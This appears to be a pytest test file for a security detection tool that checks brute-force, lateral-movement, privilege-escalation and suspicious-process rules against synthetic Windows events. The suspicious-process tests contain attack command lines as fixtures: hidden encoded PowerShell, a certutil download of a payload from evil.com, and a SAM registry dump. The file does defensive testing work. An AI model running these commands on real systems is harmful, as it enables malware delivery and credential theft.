"""Tests for ThreatLens detection rules."""

import json
from datetime import datetime, timedelta
from pathlib import Path

import pytest

from threatlens.detections import (
    BruteForceDetector,
    LateralMovementDetector,
    PrivilegeEscalationDetector,
    SuspiciousProcessDetector,
)
from threatlens.models import EventCategory, LogEvent, Severity
from threatlens.parser import load_events, parse_event, parse_timestamp


# ---- Fixtures ----

def make_failed_logon(ts: datetime, source_ip: str = "10.0.1.50", user: str = "admin") -> LogEvent:
    return LogEvent(
        timestamp=ts,
        event_id=4625,
        source="Security",
        category=EventCategory.AUTHENTICATION,
        computer="WS-PC01",
        raw={"EventID": 4625},
        username=user,
        target_username=user,
        source_ip=source_ip,
        logon_type=3,
    )


def make_network_logon(ts: datetime, user: str, computer: str, logon_type: int = 3) -> LogEvent:
    return LogEvent(
        timestamp=ts,
        event_id=4624,
        source="Security",
        category=EventCategory.AUTHENTICATION,
        computer=computer,
        raw={"EventID": 4624},
        username=user,
        target_username=user,
        source_ip="10.0.1.50",
        logon_type=logon_type,
    )


def make_priv_event(ts: datetime, user: str, privs: str) -> LogEvent:
    return LogEvent(
        timestamp=ts,
        event_id=4672,
        source="Security",
        category=EventCategory.PRIVILEGE,
        computer="DC-01",
        raw={"EventID": 4672, "EventData": {"PrivilegeList": privs}},
        username=user,
    )


def make_process_event(ts: datetime, process: str, cmd: str, user: str = "jdoe") -> LogEvent:
    return LogEvent(
        timestamp=ts,
        event_id=1,
        source="Sysmon",
        category=EventCategory.PROCESS,
        computer="WS-PC01",
        raw={"EventID": 1},
        username=user,
        process_name=process,
        command_line=cmd,
        parent_process="C:\\Windows\\System32\\cmd.exe",
    )


# ---- Parser Tests ----

class TestParser:
    def test_parse_timestamp_iso(self):
        ts = parse_timestamp("2025-01-15T08:30:01Z")
        assert ts.year == 2025
        assert ts.hour == 8

    def test_parse_timestamp_invalid(self):
        with pytest.raises(ValueError):
            parse_timestamp("not-a-timestamp")

    def test_parse_event_basic(self):
        raw = {
            "TimeCreated": "2025-01-15T08:30:01Z",
            "EventID": 4625,
            "Source": "Security",
            "Computer": "WS-PC01",
            "EventData": {
                "TargetUserName": "admin",
                "IpAddress": "10.0.1.50",
                "LogonType": 3,
            },
        }
        event = parse_event(raw)
        assert event.event_id == 4625
        assert event.username == "admin"
        assert event.source_ip == "10.0.1.50"

    def test_load_sample_data(self):
        sample = Path(__file__).parent.parent / "sample_data" / "sample_security_log.json"
        if sample.exists():
            events = load_events(sample)
            assert len(events) > 0
            assert all(isinstance(e, LogEvent) for e in events)


# ---- Brute Force Tests ----

class TestBruteForce:
    def test_triggers_on_burst(self):
        base = datetime(2025, 1, 15, 8, 30, 0)
        events = [make_failed_logon(base + timedelta(seconds=i * 5)) for i in range(7)]
        alerts = BruteForceDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].severity in (Severity.MEDIUM, Severity.HIGH)

    def test_no_alert_below_threshold(self):
        base = datetime(2025, 1, 15, 8, 30, 0)
        events = [make_failed_logon(base + timedelta(seconds=i * 5)) for i in range(3)]
        alerts = BruteForceDetector().analyze(events)
        assert len(alerts) == 0

    def test_password_spray_detected(self):
        base = datetime(2025, 1, 15, 8, 30, 0)
        users = ["admin", "jsmith", "svc_backup", "helpdesk", "dbadmin"]
        events = [
            make_failed_logon(base + timedelta(seconds=i * 2), user=u)
            for i, u in enumerate(users)
        ]
        alerts = BruteForceDetector().analyze(events)
        assert len(alerts) >= 1
        assert "Spray" in alerts[0].rule_name

    def test_no_alerts_on_empty(self):
        assert BruteForceDetector().analyze([]) == []


# ---- Lateral Movement Tests ----

class TestLateralMovement:
    def test_triggers_on_multi_host(self):
        base = datetime(2025, 1, 15, 9, 0, 0)
        events = [
            make_network_logon(base, "svc_deploy", "DC-01"),
            make_network_logon(base + timedelta(seconds=30), "svc_deploy", "FILE-SVR01"),
            make_network_logon(base + timedelta(seconds=60), "svc_deploy", "WEB-SVR01"),
        ]
        alerts = LateralMovementDetector().analyze(events)
        assert len(alerts) >= 1

    def test_no_alert_single_host(self):
        base = datetime(2025, 1, 15, 9, 0, 0)
        events = [
            make_network_logon(base, "jdoe", "WS-PC01"),
            make_network_logon(base + timedelta(seconds=30), "jdoe", "WS-PC01"),
        ]
        alerts = LateralMovementDetector().analyze(events)
        assert len(alerts) == 0

    def test_ignores_system_accounts(self):
        base = datetime(2025, 1, 15, 9, 0, 0)
        events = [
            make_network_logon(base, "SYSTEM", f"SVR-{i:02d}")
            for i in range(5)
        ]
        alerts = LateralMovementDetector().analyze(events)
        assert len(alerts) == 0


# ---- Privilege Escalation Tests ----

class TestPrivilegeEscalation:
    def test_triggers_on_debug_priv(self):
        ts = datetime(2025, 1, 15, 9, 5, 0)
        events = [make_priv_event(ts, "jdoe", "SeDebugPrivilege")]
        alerts = PrivilegeEscalationDetector().analyze(events)
        assert len(alerts) == 1
        assert alerts[0].severity == Severity.HIGH

    def test_ignores_system_account(self):
        ts = datetime(2025, 1, 15, 9, 5, 0)
        events = [make_priv_event(ts, "SYSTEM", "SeDebugPrivilege")]
        alerts = PrivilegeEscalationDetector().analyze(events)
        assert len(alerts) == 0

    def test_no_alert_for_normal_priv(self):
        ts = datetime(2025, 1, 15, 9, 5, 0)
        events = [make_priv_event(ts, "jdoe", "SeChangeNotifyPrivilege")]
        alerts = PrivilegeEscalationDetector().analyze(events)
        assert len(alerts) == 0


# ---- Suspicious Process Tests ----

class TestSuspiciousProcess:
    def test_encoded_powershell(self):
        ts = datetime(2025, 1, 15, 9, 10, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC==",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].severity == Severity.HIGH

    def test_certutil_download(self):
        ts = datetime(2025, 1, 15, 9, 10, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\certutil.exe",
            "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\svc.exe",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) >= 1

    def test_sam_dump(self):
        ts = datetime(2025, 1, 15, 9, 15, 0)
        events = [make_process_event(
            ts,
            "C:\\Windows\\System32\\reg.exe",
            "reg save HKLM\\SAM C:\\Temp\\sam.hiv",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) >= 1
        assert alerts[0].severity == Severity.CRITICAL

    def test_benign_process_no_alert(self):
        ts = datetime(2025, 1, 15, 9, 10, 0)
        events = [make_process_event(
            ts,
            "C:\\Program Files\\Notepad\\notepad.exe",
            "notepad.exe C:\\Documents\\readme.txt",
        )]
        alerts = SuspiciousProcessDetector().analyze(events)
        assert len(alerts) == 0
